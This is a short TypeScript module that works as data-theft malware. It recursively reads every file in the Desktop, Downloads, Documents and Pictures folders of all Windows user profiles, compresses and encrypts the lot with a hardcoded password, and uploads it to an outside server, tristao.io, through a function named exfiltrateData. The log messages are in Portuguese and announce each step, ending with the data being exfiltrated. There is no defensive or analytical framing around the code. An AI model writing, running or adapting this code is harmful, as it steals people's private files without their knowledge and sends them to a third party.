import fs from 'fs';
import path from 'path';
import zlib from 'zlib';
import crypto from 'crypto';
import https from 'https';
import FormData from 'form-data';

function collectDataFromFolder(folderPath: any) {
  let collectedData: any = [];

  if (fs.existsSync(folderPath)) {
    const files = fs.readdirSync(folderPath);

    files.forEach((file: any) => {
      const filePath = path.join(folderPath, file);
      if (fs.statSync(filePath).isFile()) {
        collectedData.push(fs.readFileSync(filePath));
      } else if (fs.statSync(filePath).isDirectory()) {
        collectedData = collectedData.concat(collectDataFromFolder(filePath));
      }
    });
  }
  return collectedData;
}

function collectDataFromUsers() {
  const usersData: any = [];
  const userProfiles = fs.readdirSync('C:\\Users');

  userProfiles.forEach((user: any) => {
    const userDirectory = path.join('C:\\Users', user);

    const foldersToCheck = ['Desktop', 'Downloads', 'Documents', 'Pictures'];

    foldersToCheck.forEach((folder) => {
      const folderPath = path.join(userDirectory, folder);
      const data = collectDataFromFolder(folderPath);
      usersData.push(...data);
    });
  });

  return usersData;
}

function compressData(data: any) {
  return zlib.gzipSync(Buffer.concat(data));
}

function encryptData(data: any, password: any) {
  const algorithm = 'aes-256-cbc';
  const key = crypto.scryptSync(password, 'salt', 32);
  const iv = crypto.randomBytes(16);

  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(data);
  encrypted = Buffer.concat([encrypted, cipher.final()]);

  return { encrypted, iv };
}

function exfiltrateData(encryptedData: any, iv: any) {
  const form = new FormData();
  form.append('file', encryptedData, { filename: 'data.enc' });
  form.append('iv', iv.toString('hex'));

  const requestOptions = {
    method: 'POST',
    headers: form.getHeaders(),
  };

  const req = https.request(
    'https://tristao.io:3000/upload',
    requestOptions,
    (res) => {
      console.log(`Response status: ${res.statusCode}`);
    },
  );

  form.pipe(req);
}

function execute() {
  const password = 'decrypt';

  const collectedData = collectDataFromUsers();
  console.log('Dados coletados de usuários:', collectedData.length);

  const compressedData = compressData(collectedData);
  console.log('Dados comprimidos.');

  const { encrypted, iv } = encryptData(compressedData, password);
  console.log('Dados criptografados.');

  exfiltrateData(encrypted, iv);
  console.log('Dados exfiltrados.');
}

export default execute;
